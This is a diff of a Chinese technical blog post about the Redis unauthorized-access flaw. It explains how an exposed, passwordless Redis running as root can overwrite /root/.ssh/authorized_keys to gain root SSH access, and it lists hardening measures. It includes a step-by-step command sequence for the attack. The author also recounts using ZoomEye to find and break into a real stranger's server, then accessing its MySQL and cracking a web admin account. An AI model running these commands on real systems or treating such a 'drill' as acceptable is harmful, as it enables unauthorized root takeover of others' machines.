@@ -322,14 +322,14 @@
             <blockquote>
 <p><em>在没有安全防范的情况下使用Redis“漏洞”可以将本机SSH的id_rsa.pub写入到目标机器/root/.ssh/authorize_keys文件中，从而获取目标机器的免登录root权限，而这对于目标机器来说，无疑是一种灾难</em></p>
 </blockquote>
-<h3 id="1、被攻击"><a href="#1、被攻击" class="headerlink" title="1、被攻击"></a>1、被攻击</h3><p>阿里云使用Redis的默认配置启动服务，没有设置密码，为了方便远程连接，服务器防火墙开了Redis默认的6379端口以及SSH的22端口，并且没有限制访问IP。这样做相当于把Redis暴露到公网，攻击者可以查询、修改Redis数据，甚至关闭、破坏Redis服务，考虑到目前Redis存储从数据量和重要性上需求都不大，所以并没有引起我对安全的重视。</p>
+<h3 id="被攻击"><a href="#被攻击" class="headerlink" title="被攻击"></a>被攻击</h3><p>阿里云使用Redis的默认配置启动服务，没有设置密码，为了方便远程连接，服务器防火墙开了Redis默认的6379端口以及SSH的22端口，并且没有限制访问IP。这样做相当于把Redis暴露到公网，攻击者可以查询、修改Redis数据，甚至关闭、破坏Redis服务，考虑到目前Redis存储从数据量和重要性上需求都不大，所以并没有引起我对安全的重视。</p>
 <p>最近发现之前配置的SSH免登录失效了，/root/.ssh/authorized_keys文件里面出现了类似于乱码的内容，如图1所示：</p>
 <p><img src="http://oax5iq75d.bkt.clouddn.com/%E5%9B%BE1.png" alt="图1"></p>
 <p>一开始并没有注意到文件开头的REDIS0006字样，以为是乱码，于是把内容清空了，并将自己的id_rsa.pub重新放入其中，但没过多久，文件又恢复了原样，并且有服务器被异地登录的异常。我试着搜了下REDIS0006，因此了解到这并不是简简单单的猜测到或者暴力破解到root密码的问题。</p>
-<h3 id="2、漏洞介绍"><a href="#2、漏洞介绍" class="headerlink" title="2、漏洞介绍"></a>2、漏洞介绍</h3><p>Redis服务暴露到公网，没有设置密码和其它安全策略，并且使用root权限启动，那么攻击者可以使用config命令将redis的dbfile设置为/root/.ssh下的authorized_keys，虽然名字与Linux系统的授权文件相同，但实际上是偷梁换柱，将Redis的数据库文件设置到.ssh文件夹下并覆盖原授权文件。</p>
+<h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>Redis服务暴露到公网，没有设置密码和其它安全策略，并且使用root权限启动，那么攻击者可以使用config命令将redis的dbfile设置为/root/.ssh下的authorized_keys，虽然名字与Linux系统的授权文件相同，但实际上是偷梁换柱，将Redis的数据库文件设置到.ssh文件夹下并覆盖原授权文件。</p>
 <p>因为攻击者拥有Redis的读写权限，因而可以将自己本机的id_rsa.pub伪装成Redis值的方式写入到authorized_keys文件中，从而实现SSH免登录，并且由于授权文件位于/root下，因而获得了root权限。</p>
 <p><span id="jump"></span></p>
-<h3 id="3、攻击复现"><a href="#3、攻击复现" class="headerlink" title="3、攻击复现"></a>3、攻击复现</h3><blockquote>
+<h3 id="攻击复现"><a href="#攻击复现" class="headerlink" title="攻击复现"></a>攻击复现</h3><blockquote>
 <p>假定目标机器ip为12.34.56.78</p>
 </blockquote>
 <ol>
@@ -339,7 +339,7 @@
  <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">// 将SSH公钥存入文件，加\n\n是为了匹配Redis的存储格式</div><div class="line">1. (<span class="built_in">echo</span> <span class="_">-e</span> <span class="string">"\n\n"</span>; cat id_rsa.pub; <span class="built_in">echo</span> <span class="_">-e</span> <span class="string">"\n\n"</span>) &gt; foo.txt</div><div class="line">// 连接目标服务器的Redis，并设置键foo的值为上一条命令的内容</div><div class="line">2. cat foo.txt | redis-cli -h 12.34.56.78 -x <span class="built_in">set</span> foo</div><div class="line">// 登录目标服务器的Redis</div><div class="line">3. redis-cli -h 12.34.56.78</div><div class="line">// 使用config命令将Redis的工作目录切换到/root/.ssh/下</div><div class="line">4. config <span class="built_in">set</span> dir /root/.ssh/</div><div class="line">// 设置Redis的数据存储文件为authorized_keys</div><div class="line">5. config <span class="built_in">set</span> dbfilename authorized_keys</div><div class="line">// 将Redis数据，也即键foo的值写入文件中</div><div class="line">6. save</div><div class="line">// 免密码登录目标主机，并获取root权限</div><div class="line">7. ssh root@12.34.56.78</div></pre></td></tr></table></figure>
 </li>
 </ol>
-<h3 id="4、解决方案"><a href="#4、解决方案" class="headerlink" title="4、解决方案"></a>4、解决方案</h3><blockquote>
+<h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><blockquote>
 <p>以下解决方案并非要全部实现，但使用的越多，系统会越安全</p>
 </blockquote>
 <ol>
@@ -349,9 +349,9 @@
 <li>不使用root启动Redis服务</li>
 <li>不使用默认的6379端口，或在防火墙中屏蔽掉Redis的对外接口，或配置IP访问规则，或者直接禁用掉SSH使用的22端口</li>
 </ol>
-<h3 id="5、攻击演练"><a href="#5、攻击演练" class="headerlink" title="5、攻击演练"></a>5、攻击演练</h3><p>在<a href="https://www.zoomeye.org/" target="_blank" rel="external">ZoomEye</a>上搜<a href="https://www.zoomeye.org/search?q=port%3A6379&amp;t=host" target="_blank" rel="external">port:6379</a>，找到宿主机运行Linux系统并且没有设置密码校验的机器IP，按照<a href="#jump">步骤3</a>的攻击方式，手动（真正的黑客一般不会这么玩）进行演练，约一个小时的时间才成功登录一台机器，虽然效率比较低，但获取那台机器的root权限之后我又以root身份登录了MySQL数据库，并且破解了Web应用的管理员账号，如果想要摧毁服务和系统，不费吹灰之力，当然我肯定不会这么做，因为我不是一个破坏者。</p>
+<h3 id="攻击演练"><a href="#攻击演练" class="headerlink" title="攻击演练"></a>攻击演练</h3><p>在<a href="https://www.zoomeye.org/" target="_blank" rel="external">ZoomEye</a>上搜<a href="https://www.zoomeye.org/search?q=port%3A6379&amp;t=host" target="_blank" rel="external">port:6379</a>，找到宿主机运行Linux系统并且没有设置密码校验的机器IP，按照<a href="#jump">步骤3</a>的攻击方式，手动（真正的黑客一般不会这么玩）进行演练，约一个小时的时间才成功登录一台机器，虽然效率比较低，但获取那台机器的root权限之后我又以root身份登录了MySQL数据库，并且破解了Web应用的管理员账号，如果想要摧毁服务和系统，不费吹灰之力，当然我肯定不会这么做，因为我不是一个破坏者。</p>
 <p>从上述演练可以看出来，被获取root权限的结果是多么的可怕，😱，身为一名开发人员，也应当有一定的安全意识，不然如果遇到互联网世界里的“坏人”，想要挽回损失就追悔莫及了。</p>
-<h3 id="6、参考"><a href="#6、参考" class="headerlink" title="6、参考"></a>6、参考</h3><p><a href="http://blog.jobbole.com/94518/" target="_blank" rel="external">Redis 未授权访问缺陷可轻易导致系统被黑</a></p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://blog.jobbole.com/94518/" target="_blank" rel="external">Redis 未授权访问缺陷可轻易导致系统被黑</a></p>
 <p><a href="http://blog.csdn.net/whs_321/article/details/51734602" target="_blank" rel="external">记录一次攻击事件(redis 未授权漏洞利用直接登录服务器)</a></p>
 
           
